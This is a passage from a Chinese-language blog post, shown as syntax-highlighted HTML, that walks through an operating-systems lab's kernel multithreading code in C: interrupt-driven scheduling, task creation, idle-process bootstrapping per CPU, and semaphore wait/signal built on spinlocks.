class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> WAIT_TO_AWAKE_AND_SCHEDULE:</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * 当前进程被阻塞,调用yield之前，</span></span><br><span class="line"><span class="comment">             * 然后被时间中断了</span></span><br><span class="line"><span class="comment">             * 前面已经保存过了状态，则什么都不需要做</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            panic(<span class="string">&quot;error status&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * yield中断处理程序</span></span><br><span class="line"><span class="comment"> * 这里就是简单的让进程进行调度即可</span></span><br><span class="line"><span class="comment"> * 因此这里设置进程状态即可</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> Context *</span><br><span class="line"><span class="title function_">irq_yield_handle</span><span class="params">(Event ev, Context *context)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 经过了save_context后，其task的状态只有当前cpu可以更改，无需上锁</span></span><br><span class="line"><span class="comment">     * 将其状态标注为等待调度即可</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * 如果是WAIT_TO_SCHEDULE，则是调度程序执行的yield，不用做任何更改</span></span><br><span class="line"><span class="comment">     * 其余，只可能是RUNNING状态的进程，发生yield</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    panic_on(ev.event != EVENT_YIELD, <span class="string">&quot;error ev&quot;</span>);</span><br><span class="line">    <span class="type">int</span> cpu = cpu_current();</span><br><span class="line">    <span class="type">task_t</span> *task = current_tasks[cpu];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(task-&gt;status) &#123;</span><br><span class="line">        <span class="keyword">case</span> RUNNING:</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * 说明此时程序主动放弃cpu</span></span><br><span class="line"><span class="comment">             * 想切换到其他进程，设置为调度即可</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            task-&gt;status = WAIT_TO_SCHEDULE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">case</span> WAIT_TO_LOAD:</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * 说明是调度进程完成了调度</span></span><br><span class="line"><span class="comment">             * 要将该进程恢复</span></span><br><span class="line"><span class="comment">             * 设置其状态即可</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            task-&gt;status = RUNNING;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> WAIT_TO_AWAKE_AND_SCHEDULE:</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * 当前进程被阻塞，</span></span><br><span class="line"><span class="comment">             * 然后调用了yield了</span></span><br><span class="line"><span class="comment">             * 前面已经保存过了状态，则什么都不需要做</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            panic(<span class="string">&quot;error status&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 这里用来最终完成进程的调度工作</span></span><br><span class="line"><span class="comment"> * 即os_run最后执行的逻辑</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * os_trap在处理完成任何一个进程的中断处理程序后，如果需要进行进程切换</span></span><br><span class="line"><span class="comment"> * 都会切换到该上下文中，此时被中断的程序还不可被调度，从而避免栈竞争</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">kmt_schedule</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> cpu = cpu_current();</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        yield();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">task_t</span> *task = current_tasks[cpu];</span><br><span class="line"></span><br><span class="line">        kmt_spin_lock(&amp;tasks_lock);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 现在已经和被中断进程的栈分开了，从而避免了栈竞争</span></span><br><span class="line"><span class="comment">         * 首先根据被中断的进程的状态，更改其对应的状态</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">switch</span> (task-&gt;status)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> WAIT_TO_SCHEDULE:</span><br><span class="line">                task-&gt;status = READY;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> WAIT_TO_AWAKE_AND_SCHEDULE:</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * 则其完成调度</span></span><br><span class="line"><span class="comment">             * 将其状态更改为WAIT_TO_AWAKE即可</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">                task-&gt;status = WAIT_TO_AWAKE;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                panic(<span class="string">&quot;error status&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        kmt_spin_unlock(&amp;tasks_lock);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 然后开始调度可用的进程</span></span><br><span class="line"><span class="comment">         * 由于初始时已经添加了和cpu相同个数的idle进程，因此最多遍历一轮即可获取进程</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        kmt_spin_lock(&amp;tasks_lock);</span><br><span class="line">        task = task-&gt;fd;</span><br><span class="line">        <span class="keyword">while</span>(task-&gt;status != READY) &#123; task = task-&gt;fd; &#125;</span><br><span class="line"></span><br><span class="line">        task-&gt;status = WAIT_TO_LOAD;</span><br><span class="line">        task-&gt;round = KMT_INIT_ROUND;</span><br><span class="line">        kmt_spin_unlock(&amp;tasks_lock);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//然后调用yield，将其载入即可</span></span><br><span class="line">        current_tasks[cpu] = task;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="创建进程"><a href="#创建进程" class="headerlink" title="创建进程"></a>创建进程</h4><p>  创建进程就相对来说很简单了，就是将<strong>task_t</strong>结构体填充，然后插入进程链表中即可。这里要将新创建的进程状态设置为<strong>READY</strong>，因为其应该是可以被调用的<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 创建新进程</span></span><br><span class="line"><span class="comment"> * 主要包括两个方面</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 一方面是填充传入的task指针</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 另一个方面是将当前task指针插入到所有的进程链表中</span></span><br><span class="line"><span class="comment"> * 这部分访问共享资源，需要申请锁结构</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">kmt_create</span><span class="params">(<span class="type">task_t</span> *task, <span class="type">const</span> <span class="type">char</span> *name, <span class="type">void</span> (*entry)(<span class="type">void</span> *arg), <span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    panic_on(task == <span class="literal">NULL</span>, <span class="string">&quot;error task&quot;</span>);</span><br><span class="line"></span><br><span class="line">    task-&gt;name = name;</span><br><span class="line">    task-&gt;status = READY;</span><br><span class="line">    task-&gt;round = KMT_INIT_ROUND;</span><br><span class="line">    task-&gt;context = kcontext((Area)&#123;</span><br><span class="line">        .start = task-&gt;<span class="built_in">stack</span>,</span><br><span class="line">        .end = task-&gt;<span class="built_in">stack</span> + KMT_STACK_SIZE,</span><br><span class="line">    &#125;, entry, arg);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; KMT_FENCE_SIZE; ++i) &#123;</span><br><span class="line">        task-&gt;fence1[i] = KMT_FENCE;</span><br><span class="line">        task-&gt;fence2[i] = KMT_FENCE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    kmt_spin_lock(&amp;tasks_lock);</span><br><span class="line">    list_insert(current_tasks[cpu_current()], task);</span><br><span class="line">    kmt_spin_unlock(&amp;tasks_lock);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="进程初始化"><a href="#进程初始化" class="headerlink" title="进程初始化"></a>进程初始化</h4><p>  这里稍微复杂一点，因为要基于上面的逻辑，分别实现相关的机制。下面是需要解决的几个问题</p><ol><li><strong>schedule_task</strong>指针不能为空，也就是我们需要一个调度上下文，并且不同于任何的进程的栈。</li><li><strong>currrent_task</strong>指针不能为空，也就是我们需要自举每一个cpu的第一个进程</li></ol><p>  这里采用了一个非常巧妙的方法，同时优雅的解决了这些问题。</p><p>  即给<strong>current_task</strong>指针赋值一个<strong>idle</strong>进程，作为自举的初始进程，但是将其状态设置为<strong>WAIT_TO_LOAD</strong>，也就是前面刚刚从调度进程返回的状态。</p><p>  这里解释一下，每一个CPU在第一个进程创建之前，实际上已经有了相关的栈空间，则将其当做调度上下文是再好不过了。那么，从该调度上下文切换到真正的第一个进程，就相当于一次进程调度。<br>  那么，我们只需要将当前的状态，伪造成刚刚完成一次调度，即可同时解决上述两个问题，并且非常优雅。</p><p>  且思路如下所示<br>  <img src="进程初始化.png" alt="进程初始化"></p><p>  这里实现的相关代码如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//kernel/src/kmt.c</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 需要自举每一个CPU第一个进程</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 也就是将当前正在运行的执行流，手动设置task结构体参数，作为第一个进程</span></span><br><span class="line"><span class="comment"> * 即需要设置好task结构体的相关字段，同样需要设置好链接关系</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 除此之外，初始化还需要完成锁的初始化以及其他数组的初始化</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 为了自举每个cpu的第一个进程</span></span><br><span class="line"><span class="comment"> * 将idle_entry当做其要执行的初始化函数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">idle_entry</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;;&#125;</span><br><span class="line">    panic(<span class="string">&quot;error return&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">kmt_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//初始化进程链表的锁</span></span><br><span class="line">    kmt_spin_init(&amp;tasks_lock, <span class="string">&quot;tasks_lock&quot;</span>);</span><br><span class="line"></span><br><span class="line">    current_tasks = (<span class="type">task_t</span>**)pmm-&gt;alloc(<span class="keyword">sizeof</span>(<span class="type">task_t</span>*) * cpu_count());</span><br><span class="line">    panic_on(current_tasks == <span class="literal">NULL</span>, <span class="string">&quot;not enough space&quot;</span>);</span><br><span class="line"></span><br><span class="line">    schedule_contexts = (Context**)pmm-&gt;alloc(<span class="keyword">sizeof</span>(Context*) * cpu_count());</span><br><span class="line">    panic_on(schedule_contexts == <span class="literal">NULL</span>, <span class="string">&quot;not enough space&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 初始化cpu的第一个进程，也是IDLE进程</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> cpu = <span class="number">0</span>; cpu &lt; cpu_count(); ++cpu) &#123;</span><br><span class="line">        <span class="type">task_t</span> *task = (<span class="type">task_t</span>*)pmm-&gt;alloc(<span class="keyword">sizeof</span>(<span class="type">task_t</span>));</span><br><span class="line">        panic_on(task == <span class="literal">NULL</span>, <span class="string">&quot;not enough space&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> *name = (<span class="type">char</span>*)pmm-&gt;alloc(<span class="built_in">strlen</span>(<span class="string">&quot;idle&quot;</span>) + <span class="number">3</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(name, <span class="string">&quot;idle%d&quot;</span>, cpu);</span><br><span class="line"></span><br><span class="line">        task-&gt;name = name;</span><br><span class="line">        task-&gt;status = WAIT_TO_LOAD;</span><br><span class="line">        task-&gt;round = KMT_INIT_ROUND;</span><br><span class="line">        task-&gt;context = kcontext((Area)&#123;</span><br><span class="line">            .start = task-&gt;<span class="built_in">stack</span>,</span><br><span class="line">            .end = task-&gt;<span class="built_in">stack</span> + KMT_STACK_SIZE,</span><br><span class="line">        &#125;, idle_entry, <span class="literal">NULL</span>);</span><br><span class="line">        task-&gt;fd = task-&gt;bk = task;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; KMT_FENCE_SIZE; ++i) &#123;</span><br><span class="line">            task-&gt;fence1[i] = task-&gt;fence2[i] = KMT_FENCE;</span><br><span class="line">        &#125;</span><br><span class="line">        current_tasks[cpu] = task;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;currents_task[%d]: %X\n&quot;</span>, cpu, (<span class="type">uint64_t</span>)(<span class="type">uintptr_t</span>)task);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//初始化链表关系，也就是插入链表</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> cpu = <span class="number">1</span>; cpu &lt; cpu_count(); ++cpu) &#123;</span><br><span class="line">        kmt_spin_lock(&amp;tasks_lock);</span><br><span class="line">        list_insert(current_tasks[<span class="number">0</span>], current_tasks[cpu]);</span><br><span class="line">        kmt_spin_unlock(&amp;tasks_lock);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    os-&gt;on_irq(<span class="keyword">sizeof</span>(<span class="type">int</span>) == <span class="number">4</span> ? INT32_MIN : INT64_MIN, EVENT_NULL, save_context);</span><br><span class="line">    os-&gt;on_irq(<span class="keyword">sizeof</span>(<span class="type">int</span>) == <span class="number">4</span> ? INT32_MAX : INT64_MAX, EVENT_NULL, load_context);</span><br><span class="line">    os-&gt;on_irq(TIME, EVENT_IRQ_TIMER, irq_time_handle);</span><br><span class="line">    os-&gt;on_irq(YIELD, EVENT_YIELD, irq_yield_handle);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kmt_init\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//kernel/src/os.c</span></span><br><span class="line">  <span class="type">static</span> <span class="type">void</span> <span class="title function_">os_run</span><span class="params">()</span> &#123;</span><br><span class="line">    kmt_schedule();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><h3 id="信号量-1"><a href="#信号量-1" class="headerlink" title="信号量"></a>信号量</h3><p>  对于信号量来说，当期申请的资源不够时，则将其插入到该信号量的等待队列中，并且将其状态设置为不可调度，然后主动触发<strong>yield</strong>中断切换即可<br>  而如果有进程释放了资源，岂会将该信号量中的等待队列队首进程唤醒即可，也就是从队列中摘下来，并且将其状态设置为可调度</p><p>  这里需要提醒的是，还是需要特别小心栈数据竞争。因为如果将其设置为不可调度，然后触发<strong>yield</strong>后，并且还没进入到调度上下文时，中断处理程序和被中断程序又处于同一个栈空间中。<br>  如果此时有进程释放了资源，从而直接更改了前面等待进程的状态为可调度，则可能导致前面分析过的数据竞争</p><p>  因此，解决的方法和思路和前面是一样的。确保当中断程序进入到<strong>调度上下文</strong>时，才可以更改等待进程的状态为<strong>可调度</strong></p><p>  其实现代码如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//kernel/include/common.h</span></span><br><span class="line">    <span class="comment">//信号量锁结构</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">semaphore</span> &#123;</span></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">       * 这里实际上是task_t类型指针</span></span><br><span class="line"><span class="comment">       * 但是为了统一操作，因此类型仍然是sem_t</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="type">sem_t</span> *fd, *bk;</span><br><span class="line"></span><br><span class="line">      <span class="type">spinlock_t</span> lock;</span><br><span class="line">      <span class="type">int</span> value;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//kernel/src/kmt.c</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 如果当前缺乏资源，则更改进程的状态，然后插入到等待队列中，方便再次更改状态</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 然后如果有进程释放资源，则再次更改状态即可</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">kmt_sem_init</span><span class="params">(<span class="type">sem_t</span> *sem, <span class="type">const</span> <span class="type">char</span> *name, <span class="type">int</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">    panic_on(sem == <span class="literal">NULL</span>, <span class="string">&quot;error sem&quot;</span>);</span><br><span class="line"></span><br><span class="line">    kmt_spin_init(&amp;(sem-&gt;lock), name);</span><br><span class="line">    sem-&gt;value = value;</span><br><span class="line">    sem-&gt;fd = sem-&gt;bk = sem;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 执行wait操作时</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 如果资源不足的时候，将其设置为WAIT_TO_AWAKE即可，然后插入到等待队列中</span></span><br><span class="line"><span class="comment"> * 然后调用yield即可。如果其从yield返回，则说明有进程唤醒了，此时必定有可用资源 </span></span><br><span class="line"><span class="comment"> * 插入队列的fd方向</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">kmt_sem_wait</span><span class="params">(<span class="type">sem_t</span> *sem)</span></span><br><span class="line">&#123;</span><br><span class="line">    panic_on(sem == <span class="literal">NULL</span>, <span class="string">&quot;error sem&quot;</span>);</span><br><span class="line">    kmt_spin_lock(&amp;(sem-&gt;lock));</span><br><span class="line">    <span class="keyword">if</span>(--sem-&gt;value &gt;= <span class="number">0</span>) &#123; kmt_spin_unlock(&amp;(sem-&gt;lock));&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">task_t</span> *task = current_tasks[cpu_current()]; </span><br><span class="line"></span><br><span class="line">        kmt_spin_lock(&amp;tasks_lock);</span><br><span class="line">        task-&gt;status = WAIT_TO_AWAKE_AND_SCHEDULE;</span><br><span class="line">        kmt_spin_unlock(&amp;tasks_lock);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//插入等待队列中，插入fd方向</span></span><br><span class="line">        panic_on(sem-&gt;fd-&gt;bk != sem, <span class="string">&quot;sem list is corrupted&quot;</span>); </span><br><span class="line">        <span class="type">sem_t</span> *fake_sem = (<span class="type">sem_t</span>*)field2address(<span class="type">task_t</span>, fake_sem_fd, task), *bck = sem, *fwd = sem-&gt;fd;</span><br><span class="line"></span><br><span class="line">        fake_sem-&gt;fd = fwd;</span><br><span class="line">        fake_sem-&gt;bk = bck;</span><br><span class="line">        fwd-&gt;bk = bck-&gt;fd = fake_sem;</span><br><span class="line"></span><br><span class="line">        kmt_spin_unlock(&amp;(sem-&gt;lock));</span><br><span class="line">        yield();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 执行signal操作时</span></span><br><span class="line"><span class="comment"> * 从队列中释放的时候，沿着bk的方向进行释放即可 </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">kmt_sem_signal</span><span class="params">(<span class="type">sem_t</span> *sem)</span></span><br><span class="line">&#123;</span><br><span class="line">    panic_on(sem == <span class="literal">NULL</span>, <span class="string">&quot;error sem&quot;</span>);</span><br><span class="line"></span><br><span class="line">    kmt_spin_lock(&amp;(sem-&gt;lock));</span><br><span class="line">    <span class="comment">//sem-&gt;value如果是负值，表明此时等待的进程个数</span></span><br><span class="line">    <span class="keyword">if</span>(sem-&gt;value++ &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        panic_on(sem-&gt;bk == sem, <span class="string">&quot;sem list is corrupted&quot;</span>);</span><br><span class="line">        <span class="type">sem_t</span> *fake_sem = sem-&gt;bk, *bck = fake_sem-&gt;bk, *fwd = sem;</span><br><span class="line">        bck-&gt;fd = fwd;</span><br><span class="line">        fwd-&gt;bk = bck;</span><br><span class="line">        kmt_spin_unlock(&amp;(sem-&gt;lock));</span><br><span class="line"></span><br><span class="line">        <span class="type">task_t</span> *task = field2container(<span class="type">task_t</span>, fake_sem_fd, fake_sem);</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * 等到被更改为WAIT_TO_AWAKE后，再唤醒</span></span><br><span class="line"><span class="comment">             * 避免阻塞进程在完成第一部分的调用时，发生数据竞争</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            kmt_spin_lock(&amp;tasks_lock);</span><br><span class="line">            <span class="keyword">if</span>(task-&gt;status == WAIT_TO_AWAKE) &#123;</span><br><span class="line">                task-&gt;status = READY;</span><br><span class="line">                kmt_spin_unlock(&amp;tasks_lock);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            panic_on(task-&gt;status != WAIT_TO_AWAKE_AND_SCHEDULE, <span class="string">&quot;error status&quot;</span>);</span><br><span class="line">            kmt_spin_unlock(&amp;tasks_lock);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * 这里不要调用yield</span></span><br><span class="line"><span class="comment">             *</span></span><br><span class="line"><span class="comment">             * 一方面，被阻塞进程从WAIT_TO_AWAKE状态转换到WAIT_TO_AWAKE，时间很短，没有必要</span></span><br><span class="line"><span class="comment">             * </span></span><br><span class="line"><span class="comment">             * 另一方面，kmt_sem_signal可能在中断处理程序中调用。这样子相当于在中断处理程序中触发中断</span></span><br><span class="line"><span class="comment">             * 而在中断处理程序中触发中断，相当于连续保存两次context指针，则第一次的会被覆盖掉，从而导致严重的问题</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;kmt_spin_unlock(&amp;(sem-&gt;lock));&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h2><p>  这里执行如下命令，测试实验指南中给出的测试样例<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make <span class="built_in">test</span>=kmt 